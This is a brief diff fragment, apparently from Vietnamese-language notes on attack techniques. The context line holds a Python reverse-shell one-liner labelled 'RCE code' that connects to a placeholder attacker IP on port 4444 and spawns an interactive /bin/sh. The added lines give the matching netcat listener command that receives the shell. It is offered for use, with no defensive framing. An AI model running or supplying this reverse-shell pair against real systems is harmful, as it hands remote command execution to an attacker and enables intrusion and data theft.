@@ -326,3 +326,5 @@ Tích hợp thuật toán mã hóa để che giấu dữ liệu khi ghi vào fil
 
 RCE code : python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("IP_MÁY_BẠN",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 
+lệnh netcat : nc -lvnp port_listen
+
